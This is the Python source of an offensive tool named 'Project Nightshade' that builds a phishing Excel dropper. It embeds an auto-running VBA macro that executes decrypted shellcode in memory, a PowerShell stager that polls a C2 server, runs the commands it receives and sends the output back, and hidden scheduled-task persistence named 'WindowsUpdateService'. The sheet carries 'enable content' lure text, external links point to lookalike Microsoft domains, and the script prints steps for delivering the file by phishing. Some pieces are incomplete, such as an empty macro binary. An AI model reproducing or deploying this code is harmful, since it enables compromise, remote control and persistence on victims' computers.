#!/usr/bin/env python3
"""
Project Nightshade - Advanced Excel Dropper with Ngrok Support
Author: ek0ms savi0r | OPSEC Grade: Midnight
Description:
    Creates an Excel file with OLE template injection that deploys an in-memory,
    fileless payload with persistence and encrypted C2 capabilities.
    Supports both ngrok tunneling and domain rotation for maximum flexibility.
"""
import os
import sys
import shutil
import zipfile
import tempfile
import random
import string
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import argparse
import requests

# Configuration
CONFIG = {
    'c2_server': base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8'),
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'checkin_interval': '3600',
    'persistence_method': 'scheduled_task',
    'encryption_key': 'nightshade-midnight-love-2023',
    'use_ngrok': True,  # Set to False to force domain rotation
}

# Domain rotation for fallback
STAGING_DOMAINS = [
    'cdn.microsoft-update.com',
    'assets-windows.net',
    'secure-download.office365.com',
    'template-store.azurewebsites.net'
]

def get_ngrok_tunnel_url():
    """Get the current ngrok tunnel URL from the staging server"""
    try:
        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        tunnels = response.json()['tunnels']
        for tunnel in tunnels:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def get_current_domain():
    """Rotate through available domains for OPSEC"""
    current_time = int(time.time())
    domain_index = current_time % len(STAGING_DOMAINS)
    return STAGING_DOMAINS[domain_index]

def create_remote_template_injection():
    """Create the external link that points to our staging server using domain rotation"""
    current_domain = get_current_domain()
    
    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="https://{current_domain}/template.ole" r:id="rId1"/>
</externalLink>'''
    
    return external_link

def create_ngrok_template_injection():
    """Create external link pointing to ngrok tunnel"""
    ngrok_url = get_ngrok_tunnel_url()
    
    if not ngrok_url:
        print("[!] Ngrok tunnel not available, falling back to domain rotation")
        return create_remote_template_injection()
    
    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="{ngrok_url}/template.ole" r:id="rId1"/>
</externalLink>'''
    
    return external_link

def generate_random_name(length=8):
    """Generate random filename/identifier"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def encrypt_payload(payload, key):
    """AES encrypt the payload"""
    cipher = AES.new(pad(key.encode(), AES.block_size), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def create_embedded_macro():
    """Create heavily obfuscated VBA macro"""
    vba_code = '''
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, _
    ByVal sourceAddr As LongPtr, ByVal length As Long) As Long
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long

Sub Auto_Open()
    NightshadeInitialize
End Sub

Sub Workbook_Open()
    NightshadeInitialize
End Sub

Sub NightshadeInitialize()
    On Error Resume Next
    Dim payload As String
    Dim key As String
    Dim decodedData() As Byte
    Dim i As Long
    
    ' Extract encrypted payload from document metadata
    payload = ThisWorkbook.CustomDocumentProperties("AnalysisData")
    key = "''' + CONFIG['encryption_key'] + '''"
    
    ' Decrypt and execute
    decodedData = Base64Decode(payload)
    decodedData = AESDecrypt(decodedData, key)
    
    If Len(decodedData) > 0 Then
        ExecuteInMemory decodedData
    End If
End Sub

Function Base64Decode(ByVal base64String As String) As Byte()
    ' Base64 decoding implementation
    Dim xmlObj As Object
    Dim nodeObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument")
    Set nodeObj = xmlObj.createElement("b64")
    nodeObj.DataType = "bin.base64"
    nodeObj.Text = base64String
    Base64Decode = nodeObj.nodeTypedValue
End Function

Function AESDecrypt(cipherText() As Byte, key As String) As Byte()
    ' AES decryption implementation
    Dim plainText() As Byte
    Dim aesObj As Object
    Dim decryptor As Object
    
    Set aesObj = CreateObject("System.Security.Cryptography.RijndaelManaged")
    aesObj.Key = CreateObject("System.Text.UTF8Encoding").GetBytes_4(key)
    aesObj.IV = Mid(cipherText, 1, 16)
    aesObj.Mode = 1 ' CBC
    aesObj.Padding = 2 ' PKCS7
    
    Set decryptor = aesObj.CreateDecryptor()
    plainText = decryptor.TransformFinalBlock(Mid(cipherText, 17), 0, UBound(Mid(cipherText, 17)) + 1)
    
    AESDecrypt = plainText
End Function

Sub ExecuteInMemory(payload() As Byte)
    ' In-memory execution via process hollowing or direct injection
    Dim mem As LongPtr
    Dim thread As LongPtr
    Dim i As Long
    
    mem = VirtualAlloc(0, UBound(payload) + 1, &H1000, &H40)
    For i = 0 To UBound(payload)
        RtlMoveMemory mem + i, VarPtr(payload(i)), 1
    Next i
    
    thread = CreateThread(0, 0, mem, 0, 0, 0)
    If thread <> 0 Then Sleep 10000
End Sub
'''
    return vba_code

def create_powershell_stager():
    """Create PowerShell stager for C2 communications"""
    ps_stager = '''
$key = [System.Text.Encoding]::UTF8.GetBytes('''' + CONFIG['encryption_key'] + '''')
$iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')

function Encrypt-Data($data) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
    [System.Convert]::ToBase64String($encrypted)
}

function Decrypt-Data($encryptedData) {
    $bytes = [System.Convert]::FromBase64String($encryptedData)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.Text.Encoding]::UTF8.GetString($decrypted)
}

function Establish-C2Connection {
    $sessionId = [System.Guid]::NewGuid().ToString()
    while ($true) {
        try {
            $response = Invoke-WebRequest -Uri "''' + CONFIG['c2_server'] + '''" -Method POST -Headers @{
                "User-Agent" = "''' + CONFIG['user_agent'] + '''"
                "X-Session-ID" = $sessionId
            } -Body (Encrypt-Data "checkin") -UseBasicParsing
            
            $command = Decrypt-Data $response.Content
            if ($command -ne "noop") {
                $result = Invoke-Expression $command 2>&1 | Out-String
                $encryptedResult = Encrypt-Data $result
                
                Invoke-WebRequest -Uri "''' + CONFIG['c2_server'] + '''" -Method POST -Headers @{
                    "User-Agent" = "''' + CONFIG['user_agent'] + '''"
                    "X-Session-ID" = $sessionId
                } -Body $encryptedResult -UseBasicParsing
            }
        } catch {
            # Silent error handling
        }
        Start-Sleep -Seconds ''' + CONFIG['checkin_interval'] + '''
    }
}

# Establish persistence
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$(Get-Content -Path '$PSCommandPath' | Select-Object -Skip 1 | Out-String)`""
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
$taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force

# Start C2 communication
Establish-C2Connection
'''
    return ps_stager

def create_malicious_excel(output_file):
    """Create Excel file with OLE template injection and embedded payload"""

    with tempfile.TemporaryDirectory() as tmpdir:
        excel_structure = {
            '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/workbook.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/_rels/workbook.xml.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/worksheets/sheet1.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/vbaProject.bin': b'',  # Placeholder for compiled VBA
        }

        for filepath in excel_structure.keys():
            os.makedirs(os.path.join(tmpdir, os.path.dirname(filepath)), exist_ok=True)

        workbook_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <fileRecoveryPr autoRecover="1" crashSave="1" dataRecovery="1"/>
    <workbookPr/>
    <bookViews>
        <workbookView xWindow="240" yWindow="105" windowWidth="14805" windowHeight="8010"/>
    </bookViews>
    <sheets>
        <sheet name="Report" sheetId="1" r:id="rId1"/>
    </sheets>
    <externalReferences>
        <externalReference r:id="rId2"/>
    </externalReferences>
</workbook>'''

        with open(os.path.join(tmpdir, 'xl/workbook.xml'), 'w') as f:
            f.write(workbook_content)

        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="../externalLinks/externalLink1.xml"/>
</Relationships>'''
        
        with open(os.path.join(tmpdir, 'xl/_rels/workbook.xml.rels'), 'w') as f:
            f.write(workbook_rels)

        if CONFIG['use_ngrok']:
            external_link = create_ngrok_template_injection()
            template_source = "ngrok tunnel"
            template_url = get_ngrok_tunnel_url() or "Unknown (using fallback)"
        else:
            external_link = create_remote_template_injection()
            template_source = "domain rotation"
            template_url = f"https://{get_current_domain()}/template.ole"
        
        os.makedirs(os.path.join(tmpdir, 'xl/externalLinks'), exist_ok=True)
        with open(os.path.join(tmpdir, 'xl/externalLinks/externalLink1.xml'), 'w') as f:
            f.write(external_link)

        sheet_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        <row r="1">
            <c r="A1" t="inlineStr"><is><t>IMPORTANT FINANCIAL REPORT</t></is></c>
        </row>
        <row r="2">
            <c r="A2" t="inlineStr"><is><t>Please enable content to view full analysis</t></is></c>
        </row>
        <row r="3">
            <c r="A3" t="inlineStr"><is><t>Critical vulnerabilities detected: SYSTEM COMPROMISE POSSIBLE</t></is></c>
        </row>
    </sheetData>
</worksheet>'''
        
        with open(os.path.join(tmpdir, 'xl/worksheets/sheet1.xml'), 'w') as f:
            f.write(sheet_content)

        ps_payload = create_powershell_stager()
        encrypted_payload = encrypt_payload(ps_payload, CONFIG['encryption_key'])

        ole_template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Excel.Macro.1" Version="1.0">
        <Payload>{encrypted_payload}</Payload>
        <ActivationCondition>TRUE</ActivationCondition>
    </Object>
</Objects>'''

        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, tmpdir)
                    zipf.write(file_path, arcname)
        
        print(f"[+] Created advanced Excel dropper: {output_file}")
        print(f"[+] Payload encrypted with key: {CONFIG['encryption_key']}")
        print(f"[+] C2 Server: {CONFIG['c2_server']}")
        print(f"[+] Template Source: {template_source}")
        print(f"[+] Template URL: {template_url}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Generate advanced Excel dropper')
    parser.add_argument('-o', '--output', default='Financial_Report_Q3.xlsx',
                       help='Output filename')
    parser.add_argument('--c2', help='C2 server URL')
    parser.add_argument('--key', help='Encryption key')
    parser.add_argument('--domain', help='Specific staging domain to use')
    parser.add_argument('--no-ngrok', action='store_true', help='Disable ngrok and use domain rotation')
    
    args = parser.parse_args()
    
    if args.c2:
        CONFIG['c2_server'] = args.c2
    if args.key:
        CONFIG['encryption_key'] = args.key
    if args.domain:
        global STAGING_DOMAINS
        STAGING_DOMAINS = [args.domain]
    if args.no_ngrok:
        CONFIG['use_ngrok'] = False
    
    print('''
    ╔══════════════════════════════════════════════════════════╗
    ║                   PROJECT NIGHTSHADE                     ║
    ║                 Advanced Excel Dropper                   ║
    ║                   by : ek0ms savi0r                      ║
    ╚══════════════════════════════════════════════════════════╝
    ''')
    
    print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
    print("[!] This tool creates malicious documents for penetration testing")

    if CONFIG['use_ngrok']:
        ngrok_url = get_ngrok_tunnel_url()
        if ngrok_url:
            print(f"[+] Ngrok tunnel detected: {ngrok_url}")
        else:
            print("[!] Ngrok tunnel not found - falling back to domain rotation")
    
    try:
        create_malicious_excel(args.output)
        print("\n[+] Delivery Instructions:")
        print("    1. Deliver the Excel file via phishing campaign")
        print("    2. When opened, it will attempt to load remote template")
        print("    3. Staging server validates User-Agent (Excel only)")
        print("    4. Template executes encrypted in-memory payload")
        print("    5. Payload establishes persistence and C2 connection")
        
        if CONFIG['use_ngrok']:
            print("    6. Using ngrok tunneling for infrastructure-less deployment")
        else:
            print("    6. Using domain rotation for OPSEC")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[-] Ensure all dependencies are installed")
        print("[-] pip install pycryptodome requests")

if __name__ == "__main__":
    main()
